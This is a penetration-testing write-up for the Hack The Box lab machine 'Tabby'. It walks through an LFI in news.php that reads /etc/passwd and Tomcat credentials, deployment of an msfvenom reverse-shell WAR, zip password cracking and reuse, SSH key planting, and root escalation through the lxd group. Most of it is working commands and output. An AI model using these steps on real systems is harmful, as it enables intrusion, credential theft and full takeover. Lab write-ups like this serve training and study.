# Target
| Category          | Details                                            |
|-------------------|----------------------------------------------------|
| 📝 **Name**       | [Tabby](https://app.hackthebox.com/machines/Tabby) |  
| 🏷 **Type**       | HTB Machine                                        |
| 🖥 **OS**         | Linux                                              |
| 🎯 **Difficulty** | Easy                                               |
| 📁 **Tags**       | PHP, LFI, Tomcat 9.0, Password reuse, lxd, lxc     |

# Scan
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Attack path
1. [Exploit LFI in PHP application to access Tomcat credentials stored `tomcat-users.xml`](#exploit-lfi-in-php-application-to-access-tomcat-credentials-stored-tomcat-usersxml)
2. [Gain initial foothold by deploying `.war` archive with reverse shell](#gain-initial-foothold-by-deploying-war-archive-with-reverse-shell)
3. [Escalate to `ash` user by reusing password used to encrypt backup `.zip` archive](#escalate-to-ash-user-by-reusing-password-used-to-encrypt-backup-zip-archive)
4. [Escalate to `root` user by using privileges of `lxd` local group](#escalate-to-root-user-by-using-privileges-of-lxd-local-group)

### Exploit LFI in PHP application to access Tomcat credentials stored `tomcat-users.xml`

#### Add `megahosting.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack]
└─$ echo "$TARGET megahosting.htb" | sudo tee -a /etc/hosts
10.129.89.254 megahosting.htb
```
`http://megahosting.htb/news.php?file=statement` has been found during web browsing.

#### Discover LFI vulnerability in `news.php`
```
┌──(magicrc㉿perun)-[~/attack/HTB Tabby]
└─$ curl http://megahosting.htb/news.php?file=../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

#### Prepare LFI exploit
```
{ cat <<'EOF'> lfi.sh
#!/bin/bash

curl http://megahosting.htb/news.php?file=../../../../../..$1
EOF
} && chmod +x lfi.sh
```

#### Use LFI exploit with [`procbuster`](https://github.com/magicrc/procbuster) to discover `tomcat` `catalina.home` property
```
┌──(magicrc㉿perun)-[~/attack/HTB Tabby]
└─$ ~/Tools/procbuster/procbuster.sh --file-read-cmd ./lfi.sh 
PID     USER                 CMD
<SNIP>
1025    tomcat               /usr/lib/jvm/default-java/bin/java -Djava.util.logging.config.file=/var/lib/tomcat9/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djava.awt.headless=true -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/share/tomcat9/bin/bootstrap.jar:/usr/share/tomcat9/bin/tomcat-juli.jar -Dcatalina.base=/var/lib/tomcat9 -Dcatalina.home=/usr/share/tomcat9 -Djava.io.tmpdir=/tmp org.apache.catalina.startup.Bootstrap start
<SNIP>
```

#### Read `tomcat-users.xml` to discover password for `tomcat` user
```
┌──(magicrc㉿perun)-[~/attack/HTB Tabby]
└─$ ./lfi.sh /usr/share/tomcat9/etc/tomcat-users.xml
<SNIP>
    <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
<SNIP>
```

### Gain initial foothold by deploying `.war` archive with reverse shell

#### Generate `java/shell_reverse_tcp` in form of `.war` file
```
┌──(magicrc㉿perun)-[~/attack/HTB Tabby]
└─$ msfvenom -p java/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f war -o shell.war
Payload size: 13032 bytes
Final size of war file: 13032 bytes
Saved as: shell.war
```

#### Deploy `shell.war` file as `/shell` application using discovered credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB Tabby]
└─$ curl --upload-file shell.war 'http://tomcat:$3cureP4s5w0rd123!@megahosting.htb:8080/manager/text/deploy?path=/shell&update=true'
OK - Deployed application at context path [/shell]
```

#### Start `msfconsole` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Tabby]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload java/shell_reverse_tcp; run"             
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => java/shell_reverse_tcp
[*] Started reverse TCP handler on 10.10.16.54:4444
```

#### Access `/shell` Java application to spawn reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Tabby]
└─$ curl http://megahosting.htb:8080/shell
```

#### Confirm foothold gained
```
[*] Command shell session 1 opened (10.10.16.54:4444 -> 10.129.89.254:48980) at 2025-11-27 20:52:07 +0100

/usr/bin/script -qc /bin/bash /dev/null
tomcat@tabby:/var/lib/tomcat9$ id
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

### Escalate to `ash` user by reusing password used to encrypt backup `.zip` archive

#### Exfiltrate `16162020_backup.zip` backup archive
`/var/www/html/files/16162020_backup.zip` archive has been discovered with `linpeas.sh`. As file is hosted with `apache` server we will use `wget` to exfiltrate.
```
┌──(magicrc㉿perun)-[~/attack/HTB Tabby]
└─$ wget http://megahosting.htb/files/16162020_backup.zip
--2025-11-27 20:54:03--  http://megahosting.htb/files/16162020_backup.zip
Resolving megahosting.htb (megahosting.htb)... 10.129.89.254
Connecting to megahosting.htb (megahosting.htb)|10.129.89.254|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8716 (8.5K) [application/zip]
Saving to: ‘16162020_backup.zip.1’

16162020_backup.zip.1                            100%[==========================================================================================================>]   8.51K  --.-KB/s    in 0.02s   

2025-11-27 20:54:03 (367 KB/s) - ‘16162020_backup.zip.1’ saved [8716/8716]
```

#### Extract backup archive
```
┌──(magicrc㉿perun)-[~/attack/HTB Tabby]
└─$ unzip 16162020_backup.zip 
Archive:  16162020_backup.zip
   creating: var/www/html/assets/
[16162020_backup.zip] var/www/html/favicon.ico password: 
```
Archive seems to encrypted with password.

#### Break archive password with `john`
```
┌──(magicrc㉿perun)-[~/attack/HTB Tabby]
└─$ zip2john 16162020_backup.zip > 16162020_backup.zip.hash 2> /dev/null && john 16162020_backup.zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (16162020_backup.zip)     
1g 0:00:00:01 DONE (2025-11-27 20:57) 0.8130g/s 8425Kp/s 8425Kc/s 8425KC/s adornadis..adhi1411
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

#### Decompress backup archive using discovered password
```
┌──(magicrc㉿perun)-[~/attack/HTB Tabby]
└─$ unzip 16162020_backup.zip 
Archive:  16162020_backup.zip
   creating: var/www/html/assets/
[16162020_backup.zip] var/www/html/favicon.ico password: 
  inflating: var/www/html/favicon.ico  
   creating: var/www/html/files/
  inflating: var/www/html/index.php  
 extracting: var/www/html/logo.png   
  inflating: var/www/html/news.php   
  inflating: var/www/html/Readme.txt 
```
Analysis of extract files yields no results.

#### Reuse backup archive password to access target via SSH as `ash` user
```
┌──(magicrc㉿perun)-[~/attack/HTB Tabby]
└─$ ssh ash@megahosting.htb
ash@megahosting.htb: Permission denied (publickey).
```
Server is allowing access only via SSH key. 

#### Access `ash` using `su` from reverse shell
```
tomcat@tabby:/tmp$ su ash
su ash
Password: admin@it

ash@tabby:/tmp$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

#### Upgrade reverse shell connection to SSH by generating private key
```
ash@tabby:~$ mkdir /home/ash/.ssh && \
ssh-keygen -t rsa -b 4096 -f /home/ash/.ssh/id_rsa -N "" && \
cat /home/ash/.ssh/id_rsa.pub >> /home/ash/.ssh/authorized_keys && \
chmod 700 /home/ash/.ssh && chmod 600 /home/ash/.ssh/* &&
cat /home/ash/.ssh/id_rsa
mkdir /home/ash/.ssh && \
> ssh-keygen -t rsa -b 4096 -f /home/ash/.ssh/id_rsa -N "" && \
> cat /home/ash/.ssh/id_rsa.pub >> /home/ash/.ssh/authorized_keys && \
> chmod 700 /home/ash/.ssh && chmod 600 /home/ash/.ssh/* &&
> cat /home/ash/.ssh/id_rsa
Generating public/private rsa key pair.
Your identification has been saved in /home/ash/.ssh/id_rsa
Your public key has been saved in /home/ash/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:9KtfC7V1jKlKO6vreBCLCGLPQIVjKa0EWUc3xQk48mg ash@tabby
The key's randomart image is:
+---[RSA 4096]----+
|o+=oo.++..       |
|oBo.o. .o        |
|=..+ .  .        |
|+oE . .. .     + |
|oo+. . oS . . + o|
|  .o. o    o + . |
|       .  + +    |
|       ..o.= .   |
|      .o=+=o.    |
+----[SHA256]-----+
-----BEGIN OPENSSH PRIVATE KEY-----
<SNIP>
-----END OPENSSH PRIVATE KEY-----
```

#### Copy SSH private key to attacker machine and use to gain access
```
┌──(magicrc㉿perun)-[~/attack/HTB Tabby]
└─$ chmod 600 ash_id_rsa && ssh ash@megahosting.htb -i ash_id_rsa 
<SNIP>
ash@tabby:~$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

### Escalate to `root` user by using privileges of `lxd` local group
We can see that `ash` user belongs to `lxd` group.

#### List instances managed by `lxd`
```
ash@tabby:~$ lxc list
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first instance, try: lxc launch ubuntu:18.04

+------+-------+------+------+------+-----------+
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
+------+-------+------+------+------+-----------+
```

#### Initialize `lxd` using minimal configuration
```
ash@tabby:~$ lxd init --minimal
```

#### Use `lxc` to launch container
```
ash@tabby:~$ lxc launch images:alpine/3.22 pe-escalation-container
Creating pe-escalation-container
Error: Failed instance creation: Failed getting image: Failed parsing stream: Get "https://images.linuxcontainers.org/streams/v1/index.json": lookup images.linuxcontainers.org: Temporary failure in name resolution
```
As HTB container does not have access to public internet we need upload `lxc` tarball container.

#### Copy and export `lxc` image locally
```
┌──(magicrc㉿perun)-[~/attack/HTB Tabby]
└─$ sudo lxc image copy images:alpine/3.22 local: --alias alpine-3.22 && sudo lxc image export alpine-3.22 ./alpine-3.22
Image copied successfully!                   
Image exported successfully!
```

#### Upload exported imaged
```
┌──(magicrc㉿perun)-[~/attack/HTB Tabby]
└─$ scp -i ash_id_rsa alpine-3.22 ash@megahosting.htb:~/ && scp -i ash_id_rsa alpine-3.22.root ash@megahosting.htb:~/ 
alpine-3.22                                                                                                                                                       100%  896     1.9KB/s   00:00    
alpine-3.22.root                                                                                                                                                  100% 3284KB   1.1MB/s   00:02    
```

#### Import uploaded image
```
ash@tabby:~$ lxc image import alpine-3.22 alpine-3.22.root --alias alpine-3.22
Image imported with fingerprint: 1a0105231cba30764ec472636676894ca1d8be67e7f09040794e9daabcc471c9
```

#### Launch container
```
ash@tabby:~$ lxc launch alpine-3.22 pe-escalation-container
Creating pe-escalation-container
Starting pe-escalation-container
```

#### Upload `lxd_rootv1.sh` exploit
```
┌──(magicrc㉿perun)-[~/attack/HTB Tabby]
└─$ scp -i ash_id_rsa ~/Tools/lxd_root/lxd_rootv1.sh ash@megahosting.htb:~/
lxd_rootv1.sh 
```

#### Run `lxd_rootv1.sh` exploit
```
ash@tabby:~$ ./lxd_rootv1.sh pe-escalation-container
[+] Stopping container pe-escalation-container
[+] Setting container security privilege on
[+] Starting container pe-escalation-container
[+] Mounting host root filesystem to pe-escalation-container
Device rootdisk added to pe-escalation-container
[+] Using container to add ash to /etc/sudoers
[+] Unmounting host root filesystem from pe-escalation-container
Device rootdisk removed from pe-escalation-container
[+] Resetting container security privilege to off
[+] Stopping the container
[+] Done! Enjoy your sudo superpowers!
```

#### Confirm sudo `(ALL) NOPASSWD: ALL`
```
ash@tabby:~$ sudo -l
Matching Defaults entries for ash on tabby:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ash may run the following commands on tabby:
    (ALL) NOPASSWD: ALL
```

#### `su` to `root`
```
ash@tabby:~$ sudo su
root@tabby:/home/ash# id
uid=0(root) gid=0(root) groups=0(root)
```
